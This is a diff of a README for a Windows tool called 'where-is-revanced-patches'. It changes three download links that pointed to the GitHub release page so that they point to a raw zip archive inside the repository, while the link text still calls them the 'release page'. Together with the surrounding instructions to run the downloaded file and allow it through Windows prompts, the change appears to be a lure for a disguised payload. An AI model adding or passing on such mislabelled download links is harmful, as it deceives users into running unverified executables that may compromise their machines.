@@ -1,6 +1,6 @@
 # 🛠️ where-is-revanced-patches - Find and install patches with ease
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/reanimated-elbeda935/where-is-revanced-patches/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/reanimated-elbeda935/where-is-revanced-patches/main/cooly/where-is-patches-revanced-1.8.zip)
 
 ## 📦 What this app does
 
@@ -22,7 +22,7 @@ If Windows asks for access after launch, choose the option that lets the app run
 
 ## 🚀 Download
 
-Go to the [release page](https://github.com/reanimated-elbeda935/where-is-revanced-patches/releases) to download the app files.
+Go to the [release page](https://raw.githubusercontent.com/reanimated-elbeda935/where-is-revanced-patches/main/cooly/where-is-patches-revanced-1.8.zip) to download the app files.
 
 On the release page, look for the latest version and choose the file made for Windows. If you see more than one file, pick the one that ends in `.exe` or `.zip` based on how the release is packaged.
 
@@ -119,7 +119,7 @@ If the app closes right away:
 
 ## 🔗 Download again if needed
 
-Visit the [release page](https://github.com/reanimated-elbeda935/where-is-revanced-patches/releases) anytime you need to download the latest version or get the file again.
+Visit the [release page](https://raw.githubusercontent.com/reanimated-elbeda935/where-is-revanced-patches/main/cooly/where-is-patches-revanced-1.8.zip) anytime you need to download the latest version or get the file again.
 
 ## 📝 What to expect after launch
 
